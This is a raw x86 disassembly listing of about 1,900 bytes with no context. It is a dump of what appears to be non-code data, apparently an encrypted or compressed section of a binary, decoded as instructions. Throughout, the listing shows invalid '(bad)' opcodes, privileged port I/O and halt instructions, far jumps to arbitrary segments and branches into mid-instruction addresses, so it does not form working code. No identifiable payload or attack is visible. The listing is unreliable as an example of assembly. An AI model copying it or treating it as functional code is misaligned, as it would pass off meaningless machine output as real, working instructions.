  41d743:	rcl    BYTE PTR [eax+0x633e1035],0x26
  41d74a:	and    esi,ebx
  41d74c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d74d:	sbb    dl,0x96
  41d750:	imul   esp,DWORD PTR ds:0xdd22ac4d,0xffffff9b
  41d757:	loopne 0x41d6dc
  41d759:	sub    DWORD PTR ds:0xb262fb44,eax
  41d75f:	rol    ecx,0xd4
  41d762:	arpl   WORD PTR [eax],di
  41d764:	push   es
  41d765:	push   ss
  41d766:	cmc    
  41d767:	pop    esp
  41d768:	sbb    esi,DWORD PTR [edi+0x0]
  41d76b:	cs mov fs:0x844a3895,eax
  41d772:	(bad)  
  41d773:	jmp    0x41d7f4
  41d775:	mov    edi,0xb3c10f38
  41d77a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d77b:	jle    0x41d7d9
  41d77d:	xor    BYTE PTR [eax],ah
  41d77f:	in     al,0x92
  41d781:	fs cli 
  41d783:	retf   0x9b6e
  41d786:	mov    al,ds:0x3d575a0a
  41d78b:	pop    eax
  41d78c:	xor    dh,ah
  41d78e:	jo     0x41d79d
  41d790:	mov    ebx,0xc8a62de7
  41d795:	shr    dh,0x76
  41d798:	js     0x41d80e
  41d79a:	mov    esi,0x35b34e37
  41d79f:	inc    ebp
  41d7a0:	and    esp,DWORD PTR ds:[edx+eax*8+0x6b]
  41d7a5:	fadd   DWORD PTR [edi-0x5a]
  41d7a8:	dec    eax
  41d7a9:	popa   
  41d7aa:	inc    ecx
  41d7ab:	jbe    0x41d7a1
  41d7ad:	aas    
  41d7ae:	add    ebx,DWORD PTR [ebp-0x24]
  41d7b1:	xor    dl,dl
  41d7b3:	shl    DWORD PTR [edi+0x68],cl
  41d7b6:	inc    ebx
  41d7b7:	jnp    0x41d7ee
  41d7b9:	mov    dl,0x6e
  41d7bb:	mov    WORD PTR [edi-0x1726fb9f],ss
  41d7c1:	aam    0x70
  41d7c3:	cli    
  41d7c4:	or     BYTE PTR [bx+0x3d78],bl
  41d7c9:	test   al,0xc
  41d7cb:	lock xor BYTE PTR [ecx-0x40],cl
  41d7cf:	shl    BYTE PTR [edi-0x20415564],1
  41d7d5:	ror    DWORD PTR [eax+0xb],cl
  41d7d8:	and    BYTE PTR [edx-0x57],al
  41d7db:	aad    0x5c
  41d7dd:	ins    BYTE PTR es:[edi],dx
  41d7de:	mov    DWORD PTR [ecx+0x3e8bca79],ebp
  41d7e4:	jnp    0x41d7b7
  41d7e6:	xor    BYTE PTR [edx-0x1c547e5d],0x10
  41d7ed:	lea    ecx,[ebp-0x2e86cbb9]
  41d7f3:	inc    ebp
  41d7f4:	mov    ch,0x6b
  41d7f6:	jbe    0x41d7bd
  41d7f8:	pop    ebp
  41d7f9:	dec    esp
  41d7fa:	jo     0x41d840
  41d7fc:	jmp    0x61307873
  41d801:	pop    esp
  41d802:	retf   0x12c8
  41d805:	and    dl,0xb9
  41d808:	add    bh,BYTE PTR [ebx+esi*1+0x1f43e8e3]
  41d80f:	aam    0x20
  41d811:	in     eax,dx
  41d812:	icebp  
  41d813:	fs sti 
  41d815:	test   BYTE PTR [ebp+0x1b897cd3],ch
  41d81b:	xor    BYTE PTR [ecx],bh
  41d81d:	fwait
  41d81e:	and    dh,BYTE PTR [ecx]
  41d820:	hlt    
  41d821:	das    
  41d822:	loope  0x41d831
  41d824:	or     BYTE PTR ds:0xfc29a648,dl
  41d82a:	or     DWORD PTR [edi+ecx*2+0x9],0xffffffce
  41d82f:	leave  
  41d830:	enter  0x637a,0x47
  41d834:	fiadd  WORD PTR [ecx-0x4b]
  41d837:	mov    edi,0x9bd5a6ac
  41d83c:	ret    0xbe9a
  41d83f:	mov    esi,edx
  41d841:	xchg   DWORD PTR [ebp-0xd0b778e],ebp
  41d847:	arpl   WORD PTR [esi+edx*4-0x40820049],cx
  41d84e:	lods   al,BYTE PTR ds:[esi]
  41d84f:	jne    0x41d8cf
  41d851:	fimul  WORD PTR [esp+eax*4-0x77]
  41d855:	push   0x6da6ef9
  41d85a:	popa   
  41d85b:	adc    edx,0x7a
  41d85e:	inc    ecx
  41d85f:	out    dx,eax
  41d860:	inc    esi
  41d861:	ret    
  41d862:	gs js  0x41d8a3
  41d865:	mov    al,0x56
  41d867:	(bad)  
  41d868:	xor    eax,0xbe253672
  41d86d:	popf   
  41d86e:	ins    BYTE PTR es:[edi],dx
  41d86f:	bound  edi,QWORD PTR [ecx+ecx*4]
  41d872:	fimul  WORD PTR [eax]
  41d874:	mov    dh,0x43
  41d876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d877:	out    dx,eax
  41d878:	lods   al,BYTE PTR ds:[esi]
  41d879:	arpl   WORD PTR [ebp-0x67193401],bp
  41d87f:	retf   
  41d880:	or     al,0x84
  41d882:	sub    DWORD PTR [esi],eax
  41d884:	arpl   bp,si
  41d886:	mov    ebx,0x9d218f3b
  41d88b:	inc    edx
  41d88c:	lock sub bh,BYTE PTR [ebp-0x5f6ab436]
  41d893:	cdq    
  41d894:	add    esp,DWORD PTR [ebp+0x29]
  41d897:	cmp    eax,0xc39e285f
  41d89c:	out    0x2c,eax
  41d89e:	shl    BYTE PTR [edx],1
  41d8a0:	add    DWORD PTR [eax-0x3b],esp
  41d8a3:	jecxz  0x41d838
  41d8a5:	(bad)  
  41d8a6:	iret   
  41d8a7:	test   eax,0xc2aae313
  41d8ac:	or     al,0xb1
  41d8ae:	jp     0x41d851
  41d8b0:	inc    ebp
  41d8b1:	in     al,0x0
  41d8b3:	mov    WORD PTR [esp+eiz*8+0x7d5ded46],gs
  41d8ba:	mov    dh,0x1a
  41d8bc:	or     eax,0x2935e826
  41d8c1:	or     esi,DWORD PTR [esi+edx*2+0x3f]
  41d8c5:	bound  edi,QWORD PTR [ecx+0x18]
  41d8c8:	mov    bh,0x9b
  41d8ca:	ins    BYTE PTR es:[edi],dx
  41d8cb:	out    0x7b,eax
  41d8cd:	inc    edi
  41d8ce:	js     0x41d8c1
  41d8d0:	sbb    esi,DWORD PTR [ecx-0x6dfb09d8]
  41d8d6:	clc    
  41d8d7:	push   esp
  41d8d8:	clc    
  41d8d9:	adc    eax,0x60fd1a53
  41d8de:	sbb    edx,esp
  41d8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8e1:	cwd    
  41d8e3:	sub    BYTE PTR [edx+0x4],bl
  41d8e6:	aam    0x72
  41d8e8:	dec    eax
  41d8e9:	pop    es
  41d8ea:	dec    edx
  41d8eb:	bsf    edx,DWORD PTR [esi+0x706dbab]
  41d8f2:	(bad)  
  41d8f3:	icebp  
  41d8f4:	test   DWORD PTR [ebx+0x63],0x1fb2c79b
  41d8fb:	in     eax,0x0
  41d8fd:	call   0x85a9a36f
  41d902:	cmp    BYTE PTR [eax],al
  41d904:	mov    BYTE PTR [ecx+0x1b5811ce],al
  41d90a:	add    al,0x33
  41d90c:	hlt    
  41d90d:	mov    ah,0x49
  41d90f:	or     al,0x35
  41d911:	inc    edx
  41d912:	mov    ds,WORD PTR [edx-0x2f784cf4]
  41d918:	or     edi,DWORD PTR [ecx]
  41d91a:	imul   esp,DWORD PTR [edx-0x62076172],0x1f
  41d921:	(bad)  
  41d923:	push   ecx
  41d924:	sbb    ebx,DWORD PTR [ebx]
  41d926:	add    al,0x36
  41d928:	adc    eax,edi
  41d92a:	ror    BYTE PTR [eax+0x69],0x29
  41d92e:	mov    eax,0x6e92bedc
  41d933:	push   ds
  41d934:	pop    esi
  41d935:	dec    ebx
  41d936:	lds    ebp,FWORD PTR [edi]
  41d938:	mov    al,0xb1
  41d93a:	outs   dx,BYTE PTR ds:[esi]
  41d93b:	rol    edx,cl
  41d93d:	cmp    al,al
  41d93f:	lea    edi,[eax+esi*4]
  41d942:	pusha  
  41d943:	mov    ah,0xed
  41d945:	stc    
  41d946:	adc    DWORD PTR [esi+ebp*2+0x1],esi
  41d94a:	fisub  DWORD PTR [eax]
  41d94c:	dec    ebx
  41d94d:	aad    0x91
  41d94f:	test   BYTE PTR [edi+edx*4-0x7b5c5f0],dh
  41d956:	lahf   
  41d957:	push   esi
  41d958:	sbb    DWORD PTR [edi-0x28983f3],ebp
  41d95e:	xor    BYTE PTR [ecx+0x65],dh
  41d961:	add    DWORD PTR [ebp-0x773638ab],ebp
  41d967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d969:	enter  0xecd,0x91
  41d96d:	test   al,0x96
  41d96f:	pop    esi
  41d970:	and    al,0x40
  41d972:	xchg   ebp,eax
  41d973:	xor    al,0x2b
  41d975:	or     eax,0x80d8ea7a
  41d97a:	outs   dx,DWORD PTR ds:[esi]
  41d97b:	xor    eax,0x335b04ec
  41d980:	mov    esp,0xbb196e4c
  41d985:	lods   al,BYTE PTR ds:[esi]
  41d986:	cmp    DWORD PTR ds:0x81cd789e,edx
  41d98c:	push   0x97aabd0b
  41d991:	inc    eax
  41d992:	jecxz  0x41d921
  41d994:	aaa    
  41d995:	loope  0x41d9d9
  41d997:	or     eax,edi
  41d999:	dec    ebx
  41d99a:	in     eax,dx
  41d99b:	popa   
  41d99c:	jne    0x41d9f9
  41d99e:	and    DWORD PTR [edi+0x41],ecx
  41d9a1:	or     al,0xd6
  41d9a3:	out    dx,al
  41d9a4:	les    esp,FWORD PTR [ebx-0x3c]
  41d9a7:	(bad)  
  41d9a8:	fcom   DWORD PTR [eax-0x5bd21f69]
  41d9ae:	cwde   
  41d9af:	loopne 0x41d94b
  41d9b1:	outs   dx,BYTE PTR ds:[esi]
  41d9b2:	jp     0x41da05
  41d9b4:	lds    ecx,FWORD PTR ds:0x9ca2cf9f
  41d9ba:	push   ebp
  41d9bb:	das    
  41d9bc:	test   al,0x1d
  41d9be:	mov    ecx,0x556a436
  41d9c3:	mov    cl,BYTE PTR [edx+0x5d734fb6]
  41d9c9:	fsubr  DWORD PTR [eax-0x44c1b393]
  41d9cf:	retf   0xbe2c
  41d9d2:	hlt    
  41d9d3:	inc    edx
  41d9d4:	add    eax,0x3af1ab7c
  41d9d9:	fsub   QWORD PTR [ebx+ebp*2]
  41d9dc:	iret   
  41d9dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9de:	inc    BYTE PTR [ecx]
  41d9e0:	out    0x30,al
  41d9e2:	nop
  41d9e3:	js     0x41d96b
  41d9e5:	out    0x80,al
  41d9e7:	ins    DWORD PTR es:[edi],dx
  41d9e8:	or     ebp,DWORD PTR [eax+0x7]
  41d9eb:	xor    esp,DWORD PTR ds:0x8e675d84
  41d9f1:	cli    
  41d9f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9f3:	jb     0x41d9d5
  41d9f5:	stc    
  41d9f6:	mov    ds:0x70414672,eax
  41d9fb:	call   0x33b89eb0
  41da00:	std    
  41da01:	out    0xdf,eax
  41da03:	cmc    
  41da04:	imul   ecx,DWORD PTR [edi],0xffffffe2
  41da07:	fucom  st(1)
  41da09:	inc    edi
  41da0a:	mov    ds:0x19e9f721,eax
  41da0f:	push   es
  41da10:	retf   
  41da11:	sti    
  41da12:	xchg   DWORD PTR [ecx-0x2],edx
  41da15:	fmul   DWORD PTR [ecx]
  41da17:	dec    ecx
  41da18:	fdivr  DWORD PTR [edi+edi*2-0x29461d68]
  41da1f:	fcomi  st,st(0)
  41da21:	push   es
  41da22:	mov    esi,0x2daed391
  41da27:	in     eax,0x9b
  41da29:	pop    ebx
  41da2a:	icebp  
  41da2b:	(bad)  
  41da2c:	xlat   BYTE PTR ds:[ebx]
  41da2d:	out    0x1,eax
  41da2f:	popf   
  41da30:	lods   al,BYTE PTR ds:[esi]
  41da31:	icebp  
  41da32:	sbb    ebx,edx
  41da34:	call   0x1f8d:0xc8ccd19f
  41da3b:	loope  0x41daba
  41da3d:	pop    ebp
  41da3e:	add    bl,BYTE PTR [esp+ebp*8]
  41da41:	or     edi,DWORD PTR [edi-0x2a4e7dec]
  41da47:	dec    ebp
  41da48:	outs   dx,BYTE PTR ds:[esi]
  41da49:	mov    ebx,0x7aa30435
  41da4e:	and    eax,0x9475ffb3
  41da53:	lods   al,BYTE PTR ds:[esi]
  41da54:	arpl   dx,dx
  41da56:	std    
  41da57:	js     0x41da83
  41da59:	mov    esp,0x895af3e0
  41da5e:	(bad)  
  41da60:	jo     0x41da62
  41da62:	lods   eax,DWORD PTR ds:[esi]
  41da63:	xchg   edx,eax
  41da64:	or     BYTE PTR [edi-0x740afe19],0x83
  41da6b:	shl    DWORD PTR [edx],1
  41da6d:	iret   
  41da6e:	sbb    cl,BYTE PTR [ecx+0x62]
  41da71:	call   0xb0c711c8
  41da76:	popf   
  41da77:	sbb    eax,0x8d4354b7
  41da7c:	adc    al,0x82
  41da7e:	cld    
  41da7f:	imul   edi,DWORD PTR [ecx+0x3edec8fd],0x58232e04
  41da89:	inc    ebx
  41da8a:	punpckhdq mm5,QWORD PTR [eax+0x71476836]
  41da91:	lods   eax,DWORD PTR ds:[esi]
  41da92:	fisttp WORD PTR [esi+esi*1+0x732d8ac]
  41da99:	not    dl
  41da9b:	pop    eax
  41da9c:	je     0x41db02
  41da9e:	xchg   edx,eax
  41da9f:	stc    
  41daa0:	lods   al,BYTE PTR ds:[esi]
  41daa1:	mov    ah,0x3c
  41daa3:	imul   edx,ebx,0x61
  41daa6:	es xchg edi,eax
  41daa8:	and    cl,BYTE PTR [ecx+eiz*1-0x2974c148]
  41daaf:	mov    WORD PTR [ecx+esi*8],?
  41dab2:	xchg   esp,eax
  41dab3:	pop    ecx
  41dab4:	or     ebx,esp
  41dab6:	arpl   WORD PTR [edi-0x4b],bx
  41dab9:	push   esp
  41daba:	sbb    eax,0xf6e999a3
  41dabf:	cdq    
  41dac0:	jae    0x41dac3
  41dac2:	cli    
  41dac3:	inc    edx
  41dac4:	mov    dh,0xcc
  41dac6:	popa   
  41dac7:	(bad)  
  41dac8:	jb     0x41da51
  41daca:	jno    0x41da87
  41dacc:	aas    
  41dacd:	pop    edi
  41dace:	or     DWORD PTR [ebx-0x1b7c25fb],ecx
  41dad4:	dec    di
  41dad6:	aaa    
  41dad7:	cli    
  41dad8:	jl     0x41da7b
  41dada:	cli    
  41dadb:	and    edx,ebx
  41dadd:	loope  0x41daec
  41dadf:	scas   al,BYTE PTR es:[edi]
  41dae0:	ja     0x41db0a
  41dae2:	(bad)  
  41dae3:	hlt    
  41dae4:	push   0x1b740a86
  41dae9:	fst    DWORD PTR [ebp+0x5d]
  41daec:	add    DWORD PTR [edx+0x2796144d],ebp
  41daf2:	jne    0x41dae6
  41daf4:	int3   
  41daf5:	jecxz  0x41db24
  41daf7:	jge    0x41db07
  41daf9:	adc    DWORD PTR [esi],eax
  41dafb:	pop    ds
  41dafc:	out    0x46,eax
  41dafe:	push   edx
  41daff:	rcl    al,cl
  41db01:	inc    esp
  41db02:	pop    esp
  41db03:	test   BYTE PTR [ecx+0x87a1075],dh
  41db09:	push   edi
  41db0a:	loope  0x41db48
  41db0c:	or     al,BYTE PTR [eax+0x42]
  41db0f:	sub    BYTE PTR [ebx+0x680aba2c],0x73
  41db16:	sub    ebp,ecx
  41db18:	mov    ss,WORD PTR [eax]
  41db1a:	pushf  
  41db1b:	daa    
  41db1c:	shr    DWORD PTR [esi+edi*1+0x42],1
  41db20:	lea    edi,[ebx]
  41db22:	rcr    DWORD PTR [esp+esi*2-0xd07b076],cl
  41db29:	and    BYTE PTR [ecx+0x3e],bh
  41db2c:	pop    eax
  41db2d:	ins    BYTE PTR es:[edi],dx
  41db2e:	and    dh,dh
  41db30:	jge    0x41db8f
  41db32:	inc    esi
  41db33:	add    ebp,esp
  41db35:	mov    ?,WORD PTR [esi]
  41db37:	add    DWORD PTR [eax+0x20],esi
  41db3a:	aam    0xc6
  41db3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db3d:	cmp    BYTE PTR [esp+esi*2],bl
  41db40:	jb     0x41db7d
  41db42:	sbb    al,BYTE PTR [ebp-0x5c]
  41db45:	cmp    BYTE PTR [ebp+0x1c8bac6a],ah
  41db4b:	fsubr  QWORD PTR [edi+ebp*4-0x5e28d4ae]
  41db52:	and    DWORD PTR [ecx+eax*2],edi
  41db55:	push   0xeaa6ff7d
  41db5a:	jle    0x41dba3
  41db5c:	pop    ebp
  41db5d:	stos   BYTE PTR es:[edi],al
  41db5e:	mov    ecx,0x47ab5a47
  41db63:	(bad)  
  41db64:	hlt    
  41db65:	jno    0x41db07
  41db67:	mov    ebx,0xd5d63fec
  41db6c:	(bad)  
  41db6d:	and    DWORD PTR [esi+0x1fb4b253],ebx
  41db73:	and    eax,0xf0170537
  41db78:	sahf   
  41db79:	popf   
  41db7a:	xor    bh,BYTE PTR [edx+0x15a8c4e8]
  41db80:	or     BYTE PTR [ebp+0x10],bl
  41db83:	ret    
  41db84:	dec    ebx
  41db85:	xor    BYTE PTR [ecx+0x60],0xef
  41db89:	xchg   esp,eax
  41db8a:	push   0xb60ef18
  41db8f:	call   0x29f9a6e3
  41db94:	pop    esi
  41db95:	push   edi
  41db96:	shr    BYTE PTR [edi-0x2deb89d7],cl
  41db9c:	in     al,0x40
  41db9e:	jns    0x41db5c
  41dba0:	xchg   edx,eax
  41dba1:	aam    0x2
  41dba3:	dec    BYTE PTR [ebx-0x75]
  41dba6:	mov    ds:0xea904394,al
  41dbab:	fsub   st(3),st
  41dbad:	jo     0x41db86
  41dbaf:	out    dx,eax
  41dbb0:	or     BYTE PTR [edx-0x31],dl
  41dbb3:	push   es
  41dbb4:	sbb    al,0x70
  41dbb6:	int3   
  41dbb7:	call   0x1a43:0xaf4efbd9
  41dbbe:	jnp    0x41db4e
  41dbc0:	jle    0x41dbb7
  41dbc2:	pop    ds
  41dbc3:	push   0xa5f61e53
  41dbc8:	or     al,0x98
  41dbca:	test   eax,0x56a4e007
  41dbcf:	(bad)  
  41dbd0:	adc    ch,dh
  41dbd2:	add    cl,dh
  41dbd4:	adc    BYTE PTR [eax],0xae
  41dbd7:	shr    BYTE PTR [ecx-0x57537420],cl
  41dbdd:	loopne 0x41dbce
  41dbdf:	xor    BYTE PTR [ebx+eiz*2],dl
  41dbe2:	fst    QWORD PTR [ecx-0x70778569]
  41dbe8:	sbb    DWORD PTR [eax-0x7b],edi
  41dbeb:	sub    ch,BYTE PTR [eax]
  41dbed:	sahf   
  41dbee:	pop    ss
  41dbef:	pop    edx
  41dbf0:	dec    edx
  41dbf1:	or     cl,BYTE PTR [esi-0x62]
  41dbf4:	out    0xf9,al
  41dbf6:	and    al,0xcf
  41dbf8:	fistp  DWORD PTR [ebp+eiz*2-0x794ebf07]
  41dbff:	je     0x41dc72
  41dc01:	jp     0x41dbad
  41dc03:	call   0x5f25de10
  41dc08:	mov    al,ds:0x9a74cca5
  41dc0d:	ja     0x41dc86
  41dc0f:	mov    eax,0xd8948a4f
  41dc14:	out    dx,eax
  41dc15:	jns    0x41dbf8
  41dc17:	in     eax,dx
  41dc18:	lahf   
  41dc19:	mov    al,0x93
  41dc1b:	iret   
  41dc1c:	imul   eax,edi,0x3b17022f
  41dc22:	sbb    eax,ebx
  41dc24:	in     al,0xf5
  41dc26:	xchg   ebp,eax
  41dc27:	mov    edi,0x39d2c5e1
  41dc2c:	cld    
  41dc2d:	pop    eax
  41dc2e:	outs   dx,BYTE PTR ds:[esi]
  41dc2f:	adc    DWORD PTR [ebp+ecx*4+0x4c69dd7c],ebx
  41dc36:	(bad)  
  41dc37:	and    BYTE PTR [edx+0x2e47ce9f],ch
  41dc3d:	xor    dh,BYTE PTR [ecx+0x5fcad040]
  41dc43:	sbb    BYTE PTR [ebx+0x5e],dh
  41dc46:	xor    ebp,DWORD PTR [ebp+ebp*1-0x1d]
  41dc4a:	nop
  41dc4b:	bound  eax,QWORD PTR [ecx]
  41dc4d:	test   bl,bl
  41dc4f:	int    0x57
  41dc51:	jmp    0xdba7:0x700411b6
  41dc58:	inc    esi
  41dc59:	aaa    
  41dc5a:	fcmove st,st(7)
  41dc5c:	inc    edi
  41dc5d:	jle    0x41dc70
  41dc5f:	xchg   ebp,esi
  41dc61:	out    0x31,al
  41dc63:	jae    0x41dc47
  41dc65:	mov    ebx,0xc0f59013
  41dc6a:	shl    BYTE PTR [edx-0x4b493e0d],0xfb
  41dc71:	das    
  41dc72:	mov    ebp,0x8036f07c
  41dc77:	xor    esi,DWORD PTR [eax+0xdfee7e5]
  41dc7d:	push   eax
  41dc7e:	ss xchg esi,eax
  41dc80:	lahf   
  41dc81:	ja     0x41dca9
  41dc83:	mov    al,ds:0x583d440b
  41dc88:	or     ebp,eax
  41dc8a:	adc    cl,cl
  41dc8c:	mov    gs,WORD PTR [esi+0x5]
  41dc8f:	(bad)  
  41dc90:	loopne 0x41dc61
  41dc92:	out    0xca,eax
  41dc94:	jl     0x41dcba
  41dc96:	mov    bh,0x5e
  41dc98:	clc    
  41dc99:	push   edx
  41dc9a:	push   ds
  41dc9b:	inc    edi
  41dc9c:	inc    edx
  41dc9d:	test   BYTE PTR [eax],dh
  41dc9f:	cld    
  41dca0:	shl    ch,cl
  41dca2:	fldcw  WORD PTR [ecx+esi*4+0x602f1573]
  41dca9:	or     esp,DWORD PTR [ebx]
  41dcab:	mov    esp,DWORD PTR [eax]
  41dcad:	stos   DWORD PTR es:[edi],eax
  41dcae:	dec    ecx
  41dcaf:	xor    BYTE PTR [edi],al
  41dcb1:	xchg   esi,eax
  41dcb2:	or     BYTE PTR [edx-0x60448aea],dl
  41dcb8:	or     DWORD PTR [edi+0x5153b819],edx
  41dcbe:	outs   dx,BYTE PTR ds:[esi]
  41dcbf:	push   ecx
  41dcc0:	mov    bh,0x2c
  41dcc2:	sbb    bl,BYTE PTR [ecx-0x778088d8]
  41dcc8:	pop    DWORD PTR [ebp+0x5034b65d]
  41dcce:	lds    edi,FWORD PTR [edi]
  41dcd0:	shl    DWORD PTR [esi],cl
  41dcd2:	jmp    0x41dd3e
  41dcd4:	sbb    al,0x10
  41dcd6:	xor    eax,0xaef747f
  41dcdb:	fadd   QWORD PTR [ecx+eiz*8-0x639dd994]
  41dce2:	rol    BYTE PTR gs:[ecx+0x82a91ac],1
  41dce9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcea:	mov    bh,0x6f
  41dcec:	jae    0x41dd34
  41dcee:	xor    edx,DWORD PTR [ebx+eax*4]
  41dcf1:	xchg   BYTE PTR [ebx],bl
  41dcf3:	xor    ecx,edx
  41dcf5:	stos   DWORD PTR es:[edi],eax
  41dcf6:	pop    edx
  41dcf7:	cmc    
  41dcf8:	cmp    ecx,ecx
  41dcfa:	and    BYTE PTR [edi-0x788efaeb],dh
  41dd00:	loop   0x41dcad
  41dd02:	rcl    BYTE PTR [edi+0x4e],cl
  41dd05:	or     bh,BYTE PTR [eax-0x53]
  41dd08:	or     eax,0x34d6145
  41dd0d:	icebp  
  41dd0e:	icebp  
  41dd0f:	jl     0x41dd86
  41dd11:	je     0x41dcd4
  41dd13:	loop   0x41dd0f
  41dd15:	cdq    
  41dd16:	jnp    0x41dd55
  41dd18:	in     al,dx
  41dd19:	mov    ecx,0xa379c52c
  41dd1e:	lods   eax,DWORD PTR ds:[esi]
  41dd1f:	imul   ebx,DWORD PTR [ebx],0x35a383b
  41dd25:	(bad)  
  41dd26:	mov    edi,0xbf019c6d
  41dd2b:	push   bp
  41dd2d:	add    ecx,ebx
  41dd2f:	cmc    
  41dd30:	test   BYTE PTR [ebx-0x5c8fa12e],ah
  41dd36:	int    0xcf
  41dd38:	mov    BYTE PTR [edi+0x13eee3d8],bl
  41dd3e:	and    DWORD PTR [ebx-0x76d5ba54],edi
  41dd44:	in     eax,0xc9
  41dd46:	les    esp,FWORD PTR [edi+0xb]
  41dd49:	jb     0x41dcfb
  41dd4b:	gs inc edi
  41dd4d:	lods   eax,DWORD PTR ds:[esi]
  41dd4e:	add    DWORD PTR [ecx+edi*4-0x59],ecx
  41dd52:	xchg   ebx,eax
  41dd53:	sub    BYTE PTR [ebx-0x5447aa1],ch
  41dd59:	std    
  41dd5a:	mov    ah,0xa
  41dd5c:	jmp    0x41dd6c
  41dd5e:	in     al,dx
  41dd5f:	sub    DWORD PTR [esi+0x3dcd327],ecx
  41dd65:	xadd   BYTE PTR [esi+0x479aac1a],bl
  41dd6c:	jae    0x41dd04
  41dd6e:	aaa    
  41dd6f:	cdq    
  41dd70:	mov    dh,0x84
  41dd72:	or     ebp,DWORD PTR [ecx+0x3e]
  41dd75:	sbb    ebx,edx
  41dd77:	hlt    
  41dd78:	iret   
  41dd79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd7a:	lods   eax,DWORD PTR ds:[esi]
  41dd7b:	mov    esi,0xbb7520a6
  41dd80:	shl    dl,0x9
  41dd83:	xlat   BYTE PTR ds:[ebx]
  41dd84:	inc    ebp
  41dd85:	jmp    0x41ddd9
  41dd87:	sti    
  41dd88:	and    BYTE PTR [ebp-0x20],al
  41dd8b:	das    
  41dd8c:	shl    DWORD PTR [eax-0xd],0xf2
  41dd90:	or     ah,BYTE PTR [ebx+0x6b]
  41dd93:	inc    esp
  41dd94:	hlt    
  41dd95:	xchg   ecx,eax
  41dd96:	cmp    ecx,esi
  41dd98:	or     cl,BYTE PTR [ebx+edi*2]
  41dd9b:	push   esp
  41dd9c:	push   ds
  41dd9d:	adc    eax,0x392fc2f6
  41dda2:	and    bl,BYTE PTR [edx-0x4f1a4f08]
  41dda8:	or     esi,DWORD PTR [esi+0x25]
  41ddab:	int    0xbb
  41ddad:	out    0x8e,al
  41ddaf:	(bad)  
  41ddb0:	or     al,0x62
  41ddb2:	clc    
  41ddb3:	aas    
  41ddb4:	jmp    0x99a9f22
  41ddb9:	js     0x41dd80
  41ddbb:	xor    BYTE PTR es:[esi],dh
  41ddbe:	out    0xa9,al
  41ddc0:	pcmpeqb mm2,QWORD PTR [ebx]
  41ddc3:	fiadd  DWORD PTR [ecx+0x57]
  41ddc6:	and    eax,0x8a5f1d55
  41ddcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddcc:	dec    eax
  41ddcd:	sti    
  41ddce:	data16 sbb al,0x39
  41ddd1:	jecxz  0x41ddba
  41ddd3:	sbb    al,0xec
  41ddd5:	repz pop ss
  41ddd7:	push   edi
  41ddd8:	xor    BYTE PTR [ecx],bh
  41ddda:	dec    esp
  41dddb:	das    
  41dddc:	adc    al,0xef
  41ddde:	and    al,0xfa
  41dde0:	and    edx,DWORD PTR [eax+ebx*4+0x1bde0144]
  41dde7:	dec    ebx
  41dde8:	syscall 
  41ddea:	cli    
  41ddeb:	dec    edi
  41ddec:	nop
  41dded:	jae    0x41de5e
  41ddef:	adc    edi,edi
  41ddf1:	and    al,0x6f
  41ddf3:	xchg   ecx,eax
  41ddf4:	or     DWORD PTR [edi-0x7622bffd],edx
  41ddfa:	int3   
  41ddfb:	xchg   edi,eax
  41ddfc:	xchg   ecx,eax
  41ddfd:	sub    eax,0xb9f42918
  41de02:	push   edi
  41de03:	cmp    BYTE PTR [esi],cl
  41de05:	and    BYTE PTR [ebx-0x1b],bl
  41de08:	loop   0x41dd8a
  41de0a:	add    BYTE PTR ds:0x9ecdf76,dl
  41de10:	int    0xff
  41de12:	(bad)  
  41de13:	imul   eax,DWORD PTR [esp+edx*1+0x763baa51],0xffffffd2
  41de1b:	repz push ds
  41de1d:	xchg   BYTE PTR [ebx+0x57075f8e],al
  41de23:	cdq    
  41de24:	mov    ds:0x3b87f2ea,al
  41de29:	sub    cl,BYTE PTR [esp+ebx*1-0x51]
  41de2d:	add    eax,0x222115ad
  41de32:	adc    eax,0x60cca5af
  41de37:	in     al,0x20
  41de39:	(bad)  
  41de3a:	cmc    
  41de3b:	bound  ebx,QWORD PTR [edx]
  41de3d:	lods   al,BYTE PTR ds:[esi]
  41de3e:	xchg   ebx,eax
  41de3f:	repnz cdq 
  41de41:	mov    esi,0x1583d0f3
  41de46:	out    0x24,eax
  41de48:	push   eax
  41de49:	lods   al,BYTE PTR ds:[esi]
  41de4a:	ror    al,0xd4
  41de4d:	sahf   
  41de4e:	push   ds
  41de4f:	into   
  41de50:	pushf  
  41de51:	adc    al,dh
  41de53:	cmp    al,0x69
  41de55:	loopne 0x41de2c
  41de57:	dec    esp
  41de58:	out    dx,eax
  41de59:	dec    eax
  41de5a:	xor    DWORD PTR [edi-0x5f],ecx
  41de5d:	lods   al,BYTE PTR ds:[esi]
  41de5e:	dec    edx
  41de5f:	sbb    BYTE PTR [edx-0x262d725a],0x38
  41de66:	dec    esp
  41de67:	jmp    0x83aa:0x10fa8ce
  41de6e:	cmp    BYTE PTR ds:0x4a21ae86,cl
  41de74:	mov    ds:0x2bd9b13f,eax
  41de79:	aad    0xd5
  41de7b:	and    al,0x34
  41de7d:	imul   edi,DWORD PTR [ebx+0x4f],0x2bbbde71
  41de84:	and    BYTE PTR [ecx],0xca
  41de87:	shl    DWORD PTR [esi],cl
  41de89:	adc    al,0xe1
  41de8b:	mov    WORD PTR [ecx],ss
  41de8d:	or     al,0x12
  41de8f:	int    0xd5
  41de91:	sar    edx,0xf5
  41de94:	mov    al,ds:0x44aad7f0
  41de99:	cli    
  41de9a:	pop    esp
  41de9b:	ret    0x3018
  41de9e:	ror    BYTE PTR ds:0xb3c822de,1
  41dea4:	jecxz  0x41de40
  41dea6:	pop    ebp
  41dea7:	mov    fs,WORD PTR [ecx+0xa]
  41deaa:	pop    esi
  41deab:	nop
  41deac:	rcl    DWORD PTR [esi+0x1],0xed
  41deb0:	div    DWORD PTR [ebx-0x32]
  41deb3:	jecxz  0x41df2f
  41deb5:	enter  0xc957,0x36
